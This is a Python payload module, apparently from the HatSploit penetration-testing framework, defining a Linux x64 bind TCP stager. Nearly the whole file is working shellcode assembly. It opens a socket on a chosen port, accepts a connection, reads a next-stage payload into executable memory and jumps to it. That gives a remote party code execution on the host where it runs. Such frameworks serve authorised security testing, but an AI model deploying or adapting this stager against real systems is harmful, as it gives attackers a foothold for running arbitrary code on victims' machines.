"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "Linux x64 Bind TCP",
            'Payload': "linux/x64/bind_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': """
                This payload creates an interactive bind TCP connection for Linux
                with x64 architecture and reads next stage.
            """,
            'Arch': ARCH_X64,
            'Platform': OS_LINUX,
            'Type': BIND_TCP,
        })

        self.reliable = BooleanOption('StageReliable', 'no', "Add error checks to payload.",
                                      False, advanced=True)
        self.length = IntegerOption('StageLength', None, "Length of next stage (empty to read length).",
                                    False, advanced=True)

    def run(self):
        assembly = """
        start:
            push    0x29
            pop     rax
            push    0x2
            pop     rdi
            push    0x1
            pop     rsi
            syscall
        """

        if self.reliable.value:
            assembly += """
                test    rax, rax
                js      fail
            """

        assembly += f"""
            xchg rdi, rax
            push rdx
            mov dword ptr [rsp], 0x{self.rport.little.hex()}0002
            mov rsi, rsp
            push 0x10
            pop rdx
            push 0x31
            pop rax
            syscall
        """

        if self.reliable.value:
            assembly += """
                test    rax, rax
                js      fail
            """

        assembly += """
            push 0x32
            pop rax
            syscall
        """

        if self.reliable.value:
            assembly += """
                test    rax, rax
                js      fail
            """

        assembly += """
            xor rsi, rsi
            push 0x2b
            pop rax
            syscall
        """

        if self.reliable.value:
            assembly += """
                test    rax, rax
                js      fail
            """

        if not self.length.value:
            assembly += """
                xchg    rdi, rax
                push 	rdi
                push	0x4
                pop 	rdx
                push 	0x0
                lea 	rsi, [rsp]
                xor 	rax, rax
                syscall
            """

        else:
            assembly += f"""
                push    rax
                push    {hex(self.length.value)}
            """

        assembly += """
            pop 	rsi
            push 	0x9
            pop 	rax
            xor 	rdi, rdi
            push 	0x7
            pop 	rdx
            xor		r9, r9
            push	0x22
            pop		r10
            syscall
        """

        if self.reliable.value:
            assembly += """
                test    rax, rax
                js      fail
            """

        assembly += """
            pop		rdi
            push 	rsi
            pop 	rdx
            push 	rax
            pop		rsi
            push 	0x2d
            pop		rax
            push	0x100
            pop		r10
            syscall
        """

        if self.reliable.value:
            assembly += """
                test    rax, rax
                js      fail
            """

        assembly += """
            jmp rsi
        """

        if self.reliable.value:
            assembly += """
            fail:
                push    0x3c
                pop     rax
                xor     rdi, rdi
                syscall
            """

        return self.__asm__(assembly)
